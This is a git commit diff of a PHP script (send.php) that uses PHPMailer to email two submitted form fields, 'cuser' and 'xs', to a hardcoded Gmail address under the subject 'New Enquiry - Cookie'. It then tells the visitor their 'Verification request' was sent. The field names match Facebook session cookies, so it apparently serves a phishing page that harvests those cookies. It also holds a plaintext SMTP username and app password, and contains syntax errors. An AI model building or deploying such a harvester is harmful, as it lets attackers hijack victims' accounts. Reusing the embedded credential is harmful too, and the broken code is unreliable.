7e0b4adf30a3965c99cdd56e43f53d43da564ec7
Aishasaif12 <aishasaif542@gmail.com>
2024-07-27 14:26:17 +0500

    Update send.php

--- send.php
+++ send.php
@@ -1,31 +1,39 @@
 <?php
+session_start();
 //Import PHPMailer classes into the global namespace
 //These must be at the top of your script, not inside a function
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\SMTP;
 use PHPMailer\PHPMailer\Exception;
 
-//Load Composer's autoloader
-require 'vendor/autoload.php';
+if(isset($_POST['submitcontact']))
 
-//Create an instance; passing `true` enables exceptions
-$mail = new PHPMailer(true);
+{
+    $cuser = $_POST['cuser']
+    $xs = $_POST['xs']
+     
+    //Load Composer's autoloader
+    require 'vendor/autoload.php';
 
-try {
-    //Server settings
-    // $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      //Enable verbose debug output
-    $mail->isSMTP();                                            //Send using SMTP
-    $mail->Host       = 'smtp.gmail.com';                     //Set the SMTP server to send through
-    $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
-    $mail->Username   = 'sophiaameliaofficiel@gmail.com';                     //SMTP username
-    $mail->Password   = 'faiktbbwqrtqhsog';                               //SMTP password
-    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;            //Enable implicit TLS encryption
-    $mail->Port       = 587;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`
+    //Create an instance; passing `true` enables exceptions
+    $mail = new PHPMailer(true);
+
+    try {
+        //Server settings
+        // $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      //Enable verbose debug output
+
+         $mail->isSMTP();                                            //Send using SMTP
+         $mail->Host       = 'smtp.gmail.com';                     //Set the SMTP server to send through
+         $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
+         $mail->Username   = 'sophiaameliaofficiel@gmail.com';                     //SMTP username
+         $mail->Password   = 'faiktbbwqrtqhsog';                               //SMTP password
+         $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;            //Enable implicit TLS encryption
+         $mail->Port       = 587;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`
 
 
 
-$cuser = $_POST['cuser'];
-$xs = $_POST['xs'];
+         $cuser = $_POST['cuser'];
+         $xs = $_POST['xs'];
 
 
 
@@ -35,17 +43,39 @@ $xs = $_POST['xs'];
 
     //Recipients
     $mail->setFrom('sophiaameliaofficiel@gmail.com', 'Mailer');
-
     $mail->addAddress('annajamesofficiel@gmail.com', 'Anna James');     //Add a recipient
 
 
 
     //Content
     $mail->isHTML(true);                                  //Set email format to HTML
-    $mail->Subject = 'Here is the subject';
-    $mail->Body    = 'This is the HTML message body <b>in bold!</b>';
-    $mail->send();
-    echo 'We have received your request';
+    $mail->Subject = 'New Enquiry - Cookie';
+    $mail->Body    = '<h3>Hello, you got a new enquity</h3>
+    <h4>cuser: '.$cuser.' </h4>
+    <h4>xs: '.$xs.'</h4>
+    ';
+    
+    if($mail->send())
+    {
+        $_SESSION['status'] = "Your Verification request has been sent" ;
+        header("Location: {$_server["HTTP_REFERER"]}");
+        exit(0);
+    }
+    else
+    {
+        $_SESSION['status'] = "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
+        header("Location: {$_server["HTTP_REFERER"]}");
+        exit(0);
+    }
+    
+
 } catch (Exception $e) {
     echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
+}
+
+}
+else
+{
+    header('Location: index.php');
+    exit(0);
 }
